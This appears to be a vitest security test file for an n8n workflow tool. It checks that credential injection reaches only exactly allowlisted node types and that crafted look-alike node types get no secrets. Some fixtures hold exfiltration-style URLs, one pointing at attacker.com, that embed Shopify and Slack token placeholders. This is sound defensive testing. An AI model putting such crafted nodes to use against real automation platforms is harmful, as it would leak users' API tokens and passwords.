/**
 * Allowlist security tests — exact node-type matching
 *
 * These tests verify that ONLY explicitly approved n8n node types receive
 * credential injection. Every test calls injectCredentialsIntoWorkflow() directly
 * with real fixture credentials and inspects the actual output.
 *
 * Group A: Crafted fake provider node types must receive ZERO credentials
 *   Tests in this group fail on the substring-match implementation and
 *   pass only after the exact-allowlist patch is applied.
 *
 * Group B: Whitelisted legitimate node types still receive correct credentials
 *
 * Group C: Allowlist boundary — all whitelisted types receive credentials,
 *   nothing outside the list does.
 */

import { describe, it, expect } from 'vitest';
import { injectCredentialsIntoWorkflow, type IntegrationRecord } from '../lib/integrations';

// ── Fixtures ──────────────────────────────────────────────────────────────────

// Credential values use clearly synthetic strings that do NOT appear inside
// any {{ $env.* }} placeholder name. This prevents false-positive failures where
// a blocked node's literal placeholder text accidentally matches a secret value.
const ALL_INTEGRATIONS: IntegrationRecord[] = [
  {
    provider: 'shopify',
    credentials: {
      admin_access_token: 'shpat_xR9mQk2vL7nBwZ4',
      api_key:            'shpsk_yH3jTp8dC5eKnM1',
      shop_domain:        'victim-store.myshopify.com',
    },
  },
  {
    provider: 'slack',
    credentials: {
      webhook_url: 'https://hooks.slack.com/services/T0A1B2/C3D4E5/xR9mSlackSecret',
    },
  },
  {
    provider: 'gmail',
    credentials: {
      smtp_user: 'victim.account@example.com',
      smtp_pass: 'zP7qSmtpPasswd!9kL',
      smtp_host: 'smtp.gmail.com',
      smtp_port: '587',
    },
  },
  {
    provider: 'airtable',
    credentials: {
      airtable_token: 'patXk2mAirtableRealToken',
      base_id:        'appZzW3RealBaseId99',
      table_name:     'LiveOrders',
    },
  },
];

const SECRETS = [
  'shpat_xR9mQk2vL7nBwZ4',
  'shpsk_yH3jTp8dC5eKnM1',
  'victim-store.myshopify.com',
  'xR9mSlackSecret',
  'zP7qSmtpPasswd!9kL',
  'victim.account@example.com',
  'patXk2mAirtableRealToken',
  'appZzW3RealBaseId99',
];

/** Asserts that none of the known secrets appear anywhere in the node's JSON. */
function assertNoCredentials(node: Record<string, unknown>, label: string): void {
  const serialized = JSON.stringify(node);
  for (const secret of SECRETS) {
    expect(serialized, `${label}: secret "${secret}" must not appear`).not.toContain(secret);
  }
}

/** All credential placeholders that should remain as literal strings when blocked. */
const ALL_PLACEHOLDERS = [
  '{{ $env.SHOPIFY_ACCESS_TOKEN }}',
  '{{ $env.SHOPIFY_API_KEY }}',
  '{{ $env.SLACK_WEBHOOK_URL }}',
  '{{ $env.SMTP_PASS }}',
  '{{ $env.SMTP_USER }}',
  '{{ $env.AIRTABLE_API_KEY }}',
  '{{ user.shopify.token }}',
  '{{ user.slack.webhook_url }}',
  '{{ user.email.smtp_pass }}',
  '{{ user.airtable.api_key }}',
];

function injectSingle(node: Record<string, unknown>): Record<string, unknown> {
  const result = injectCredentialsIntoWorkflow(
    { name: 'test', nodes: [node], connections: {} },
    ALL_INTEGRATIONS
  );
  return ((result.nodes as Array<Record<string, unknown>>)[0]);
}

// ─── Group A: Crafted fake provider node types ────────────────────────────────
//
// These FAIL on substring-match code and PASS after exact-allowlist patch.

describe('A — Fake provider node types: must receive NO credentials', () => {

  it('A1: n8n-nodes-base.shopifyFakeHttp — no Shopify credentials', () => {
    const node = injectSingle({
      type: 'n8n-nodes-base.shopifyFakeHttp',
      parameters: {
        url: 'https://attacker.com/?t={{ $env.SHOPIFY_ACCESS_TOKEN }}&k={{ $env.SHOPIFY_API_KEY }}',
      },
    });
    assertNoCredentials(node, 'shopifyFakeHttp');
    // Placeholders must remain literal
    const url = (node.parameters as Record<string, string>).url;
    expect(url).toContain('{{ $env.SHOPIFY_ACCESS_TOKEN }}');
    expect(url).toContain('{{ $env.SHOPIFY_API_KEY }}');
    // params.accessToken must NOT have been set
    expect((node.parameters as Record<string, unknown>).accessToken).toBeUndefined();
  });

  it('A2: n8n-nodes-base.slackCustom — no Slack credentials, no webhook conversion', () => {
    const node = injectSingle({
      type: 'n8n-nodes-base.slackCustom',
      parameters: {
        url:  '{{ $env.SLACK_WEBHOOK_URL }}',
        text: 'hello',
      },
    });
    assertNoCredentials(node, 'slackCustom');
    // Must NOT have been converted to an httpRequest
    expect(node.type).toBe('n8n-nodes-base.slackCustom');
    // Placeholder literal
    expect((node.parameters as Record<string, string>).url).toBe('{{ $env.SLACK_WEBHOOK_URL }}');
  });

  it('A3: n8n-nodes-base.airtableProxy — no Airtable credentials', () => {
    const node = injectSingle({
      type: 'n8n-nodes-base.airtableProxy',
      parameters: {
        apiKey: '{{ $env.AIRTABLE_API_KEY }}',
        base:   '{{ $env.AIRTABLE_BASE_ID }}',
      },
    });
    assertNoCredentials(node, 'airtableProxy');
    // params.apiKey must NOT have been set by type-specific injection
    expect((node.parameters as Record<string, string>).apiKey).toBe('{{ $env.AIRTABLE_API_KEY }}');
    // params.base must NOT have been overwritten with real base_id
    expect((node.parameters as Record<string, string>).base).toBe('{{ $env.AIRTABLE_BASE_ID }}');
  });

  it('A4: n8n-nodes-base.gmailWebhook — no Gmail/SMTP credentials', () => {
    const node = injectSingle({
      type: 'n8n-nodes-base.gmailWebhook',
      parameters: {
        pass: '{{ $env.SMTP_PASS }}',
        user: '{{ $env.SMTP_USER }}',
      },
    });
    assertNoCredentials(node, 'gmailWebhook');
    expect((node.parameters as Record<string, string>).pass).toBe('{{ $env.SMTP_PASS }}');
    expect((node.parameters as Record<string, string>).user).toBe('{{ $env.SMTP_USER }}');
  });

  it('A5: custom-shopify-node — no Shopify credentials (arbitrary prefix)', () => {
    const node = injectSingle({
      type: 'company.shopifyOrderProcessor',
      parameters: {
        token: '{{ user.shopify.token }}',
      },
    });
    assertNoCredentials(node, 'company.shopifyOrderProcessor');
    expect((node.parameters as Record<string, string>).token).toBe('{{ user.shopify.token }}');
  });

  it('A6: n8n-nodes-base.slackEnterprise — no credentials (future fake enterprise node)', () => {
    const node = injectSingle({
      type: 'n8n-nodes-base.slackEnterprise',
      parameters: {
        webhook: '{{ user.slack.webhook_url }}',
      },
    });
    assertNoCredentials(node, 'slackEnterprise');
    expect(node.type).not.toBe('n8n-nodes-base.httpRequest');
  });

  it('A7: ALL placeholders in ALL crafted types remain literal in one workflow', () => {
    const crafted = [
      { type: 'n8n-nodes-base.shopifyFakeHttp',  parameters: { url: ALL_PLACEHOLDERS.join(' ') } },
      { type: 'n8n-nodes-base.slackCustom',       parameters: { url: ALL_PLACEHOLDERS.join(' ') } },
      { type: 'n8n-nodes-base.airtableProxy',     parameters: { url: ALL_PLACEHOLDERS.join(' ') } },
      { type: 'n8n-nodes-base.gmailWebhook',      parameters: { url: ALL_PLACEHOLDERS.join(' ') } },
    ];
    const result = injectCredentialsIntoWorkflow(
      { name: 'attack', nodes: crafted, connections: {} },
      ALL_INTEGRATIONS
    );
    const nodes = result.nodes as Array<Record<string, unknown>>;
    for (const node of nodes) {
      assertNoCredentials(node, String(node.type));
    }
  });

});

// ─── Group B: Legitimate allowlisted nodes still receive correct credentials ──

describe('B — Allowlisted nodes: correct credentials injected', () => {

  it('B1: n8n-nodes-base.shopify — receives Shopify token', () => {
    const node = injectSingle({
      type: 'n8n-nodes-base.shopify',
      parameters: { resource: 'order', accessToken: '{{ $env.SHOPIFY_ACCESS_TOKEN }}' },
    });
    const params = node.parameters as Record<string, string>;
    expect(params.accessToken).toBe('shpat_xR9mQk2vL7nBwZ4');
    expect(params.storeUrl).toBe('victim-store.myshopify.com');
  });

  it('B2: n8n-nodes-base.slack — converted to httpRequest with real webhook', () => {
    const node = injectSingle({
      type: 'n8n-nodes-base.slack',
      parameters: { text: 'Order confirmed' },
    });
    expect(node.type).toBe('n8n-nodes-base.httpRequest');
    expect((node.parameters as Record<string, string>).url).toContain('xR9mSlackSecret');
  });

  it('B3: n8n-nodes-base.airtable — receives Airtable token and base', () => {
    const node = injectSingle({
      type: 'n8n-nodes-base.airtable',
      parameters: {},
    });
    const params = node.parameters as Record<string, string>;
    expect(params.apiKey).toBe('patXk2mAirtableRealToken');
    expect(params.base).toBe('appZzW3RealBaseId99');
  });

  it('B4: n8n-nodes-base.emailSend — receives SMTP credentials', () => {
    const node = injectSingle({
      type: 'n8n-nodes-base.emailSend',
      parameters: {
        user: '{{ $env.SMTP_USER }}',
        pass: '{{ $env.SMTP_PASS }}',
        host: '{{ $env.SMTP_HOST }}',
        port: '{{ $env.SMTP_PORT }}',
      },
    });
    const params = node.parameters as Record<string, string>;
    expect(params.user).toBe('victim.account@example.com');
    expect(params.pass).toBe('zP7qSmtpPasswd!9kL');
    expect(params.host).toBe('smtp.gmail.com');
    expect(params.port).toBe('587');
  });

  it('B5: n8n-nodes-base.gmail — receives Gmail/SMTP credentials', () => {
    const node = injectSingle({
      type: 'n8n-nodes-base.gmail',
      parameters: { user: '{{ $env.SMTP_USER }}', pass: '{{ $env.SMTP_PASS }}' },
    });
    const params = node.parameters as Record<string, string>;
    expect(params.user).toBe('victim.account@example.com');
    expect(params.pass).toBe('zP7qSmtpPasswd!9kL');
  });

  it('B6: n8n-nodes-base.emailReadImap — receives SMTP credentials', () => {
    const node = injectSingle({
      type: 'n8n-nodes-base.emailReadImap',
      parameters: { pass: '{{ $env.SMTP_PASS }}' },
    });
    expect((node.parameters as Record<string, string>).pass).toBe('zP7qSmtpPasswd!9kL');
  });

});

// ─── Group C: Allowlist boundary — exhaustive check ───────────────────────────

describe('C — Allowlist boundary: each entry injected, everything outside is not', () => {

  const ALLOWLISTED: Array<{ type: string; expectSecret: string }> = [
    { type: 'n8n-nodes-base.shopify',        expectSecret: 'shpat_xR9mQk2vL7nBwZ4'      },
    { type: 'n8n-nodes-base.shopifyTrigger', expectSecret: 'shpat_xR9mQk2vL7nBwZ4'      },
    { type: 'n8n-nodes-base.airtable',        expectSecret: 'patXk2mAirtableRealToken'   },
    { type: 'n8n-nodes-base.airtableTrigger', expectSecret: 'patXk2mAirtableRealToken'   },
    { type: 'n8n-nodes-base.emailSend',       expectSecret: 'zP7qSmtpPasswd!9kL'         },
    { type: 'n8n-nodes-base.emailReadImap',   expectSecret: 'zP7qSmtpPasswd!9kL'         },
    { type: 'n8n-nodes-base.gmail',           expectSecret: 'zP7qSmtpPasswd!9kL'         },
    { type: 'n8n-nodes-base.gmailTrigger',    expectSecret: 'zP7qSmtpPasswd!9kL'         },
  ];

  for (const { type, expectSecret } of ALLOWLISTED) {
    it(`${type} — IS allowlisted and receives credentials`, () => {
      const node = injectSingle({
        type,
        parameters: {
          accessToken: '{{ $env.SHOPIFY_ACCESS_TOKEN }}',
          apiKey:      '{{ $env.AIRTABLE_API_KEY }}',
          pass:        '{{ $env.SMTP_PASS }}',
        },
      });
      // At least the expected provider secret appears
      expect(JSON.stringify(node)).toContain(expectSecret);
    });
  }

  const NOT_ALLOWLISTED = [
    'n8n-nodes-base.httpRequest',
    'n8n-nodes-base.shopifyFakeHttp',
    'n8n-nodes-base.slackCustom',
    'n8n-nodes-base.airtableProxy',
    'n8n-nodes-base.gmailWebhook',
    'n8n-nodes-base.slackEnterprise',
    'n8n-nodes-base.emailFakeHttp',
    'n8n-nodes-base.shopifySlackCombined',
    'n8n-nodes-base.code',
    'n8n-nodes-base.set',
    'n8n-nodes-base.if',
    'n8n-nodes-base.merge',
    'n8n-nodes-base.webhook',
    'company.shopifyProxy',
    'custom.slackNotifier',
  ];

  for (const type of NOT_ALLOWLISTED) {
    it(`${type} — NOT allowlisted, receives zero credentials`, () => {
      const node = injectSingle({
        type,
        parameters: {
          url:  'https://a.com/?t={{ $env.SHOPIFY_ACCESS_TOKEN }}&s={{ $env.SLACK_WEBHOOK_URL }}',
          pass: '{{ $env.SMTP_PASS }}',
          key:  '{{ $env.AIRTABLE_API_KEY }}',
        },
      });
      assertNoCredentials(node, type);
    });
  }

});
